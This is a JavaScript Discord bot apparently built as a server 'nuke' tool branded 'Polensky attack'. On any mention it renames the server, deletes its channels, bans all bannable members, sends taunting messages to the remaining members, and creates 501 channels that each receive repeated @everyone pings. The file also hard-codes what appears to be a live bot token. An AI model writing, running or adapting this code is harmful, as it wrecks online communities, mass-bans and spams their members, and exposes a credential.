const Discord = require('discord.js')
const client = new Discord.Client({intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MEMBERS, Discord.Intents.FLAGS.GUILD_MESSAGES,Discord.Intents.FLAGS.GUILD_INTEGRATIONS]})
client.login('ODA5NDYyMjQ3NTExNjg3MTc5.YCVcdg.pydRlF3YR4hIs6xtgdjrPzoCqGM')
client.on('messageCreate',async (message)=>{
    
    if(message.mentions.members.first() || message.mentions.roles.first() || message.mentions.everyone){
        if(message.author.id == client.user.id) return;
        message.guild.setIcon('./nuke.png','Polensky attack')
        message.guild.setName('Nuked','Polensky attack')
        message.guild.channels.cache.forEach(channel=>{
            if(channel.deletable){
            channel.delete('Polensky attack')
            }
        })
        message.guild.members.cache.forEach(member=>{
if(member.bannable){
    member.ban({
        reason: 'Polensky attack'
    })
}
else{
    if(member.user.bot) return;
    member.send({
        embeds:[new Discord.MessageEmbed()
        .setTitle('Polensky')
    .setDescription('You were attacked by Polensky Nuke Attack !')
.setColor('YELLOW')
.setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
.setFooter({text:'Sadly'})]
    })
    member.send({
        embeds:[new Discord.MessageEmbed()
        .setTitle('Polensky')
    .setDescription('Vous avez été attaqué par l\'attaque nuke de Polensky !')
.setColor('YELLOW')
.setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Nuclear_symbol.svg/2048px-Nuclear_symbol.svg.png')
.setFooter({text:'Tristement'})]
    })
}
        })
       for(let i = 0;i<501;i++){
        message.guild.channels.create('🙂H4CKED',{reason: 'Polensky attack'}).then(channel=>{
            for(let r = 1; r<20;r++){
            channel.send('@everyone')
            }
        })
       }
    }
    
})